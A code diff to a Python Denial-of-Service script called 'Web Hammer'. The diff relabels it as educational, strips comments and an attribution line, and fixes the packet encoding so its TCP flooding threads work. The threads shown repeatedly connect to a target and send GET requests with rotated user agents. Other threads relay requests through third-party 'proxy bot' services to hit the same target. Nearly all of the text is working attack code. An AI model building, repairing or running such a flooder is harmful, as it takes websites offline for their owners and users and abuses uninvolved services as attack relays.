@@ -2,10 +2,9 @@
 # -*- coding: utf-8 -*-
 
 """
-Web Hammer Script 
+Web Hammer Script (Refactored for Educational Purposes)
 
 Original by shuvo-halder: https://github.com/shuvo-halder/web-hammer
-Upgraded by BinRecon: https://github.com/BinRecon
 Refactored to demonstrate modern Python best practices.
 
 DISCLAIMER: This is a Denial-of-Service (DoS) tool. Using it against any
@@ -24,7 +23,6 @@ import time
 import urllib.request
 from urllib.error import URLError
 
-# --- Configuration Constants ---
 DEFAULT_HEADERS = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Connection: keep-alive
@@ -73,27 +71,30 @@ class WebHammer:
     def _socket_hammer(self):
         """Continuously sends raw TCP packets to the target host."""
         logging.info(f"Socket hammering thread started for {self.host}:{self.port}")
+        
         packet_template = (
             f"GET / HTTP/1.1\r\n"
             f"Host: {self.host}\r\n"
             f"{self.custom_headers}\r\n"
             f"User-Agent: {{user_agent}}\r\n\r\n"
-        ).encode('utf-8')
+        )
 
         while self.is_running:
             try:
-                # Reuse socket for efficiency within the thread's loop
+                request_string = packet_template.format(user_agent=random.choice(USER_AGENTS))
+                
+                packet_bytes = request_string.encode('utf-8')
+
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     s.settimeout(2)
                     s.connect((self.host, self.port))
                     
-                    # Use .send() for TCP, not .sendto()
-                    packet = packet_template.format(user_agent=random.choice(USER_AGENTS))
-                    s.send(packet)
+                    # 3. Send the bytes
+                    s.send(packet_bytes)
                     logging.debug(f"Packet sent to {self.host}:{self.port}")
             except (socket.error, ConnectionRefusedError, socket.timeout) as e:
                 logging.error(f"Socket error: {e}. Server may be down or blocking.")
-                time.sleep(5) # Wait a bit longer if connection fails
+                time.sleep(5)
             except Exception as e:
                 logging.error(f"An unexpected error occurred in socket_hammer: {e}")
             
@@ -107,11 +108,11 @@ class WebHammer:
                 bot_url = random.choice(PROXY_BOTS) + self.target_url
                 headers = {'User-Agent': random.choice(USER_AGENTS)}
                 req = urllib.request.Request(bot_url, headers=headers)
-                # Using a timeout is crucial to prevent hanging
                 with urllib.request.urlopen(req, timeout=5) as response:
                     logging.debug(f"Proxy request sent via {bot_url} - Status: {response.getcode()}")
             except (URLError, socket.timeout) as e:
-                logging.error(f"Proxy request failed: {e}")
+                # These errors (403, 400, etc.) are expected as services block abuse
+                logging.debug(f"Proxy request failed: {e}")
             except Exception as e:
                 logging.error(f"An unexpected error occurred in proxy_hammer: {e}")
             
@@ -121,10 +122,8 @@ class WebHammer:
         """Initializes and starts the hammering threads."""
         self.is_running = True
         for i in range(self.threads):
-            # Socket-based hammering threads
             t1 = threading.Thread(target=self._socket_hammer, daemon=True)
             t1.start()
-            # Proxy-based hammering threads
             t2 = threading.Thread(target=self._proxy_hammer, daemon=True)
             t2.start()
         logging.info(f"Started {self.threads * 2} threads ({self.threads} for each method).")
@@ -140,13 +139,11 @@ class WebHammer:
         self._start_threads()
 
         try:
-            # Keep the main thread alive while daemon threads do the work
             while self.is_running:
                 time.sleep(1)
         except KeyboardInterrupt:
             logging.info("\nCTRL+C received. Shutting down...")
             self.is_running = False
-            # Wait for threads to finish their current loop iteration
             time.sleep(2)
             logging.info("Hammer stopped.")
             sys.exit(0)
@@ -175,7 +172,6 @@ def main():
     args = parser.parse_args()
     logging.basicConfig(level=args.loglevel, format="%(asctime)s - %(levelname)s - %(message)s")
 
-    # Initial connection check
     try:
         logging.info(f"Checking connection to {args.server}:{args.port}...")
         with socket.create_connection((args.server, args.port), timeout=5):
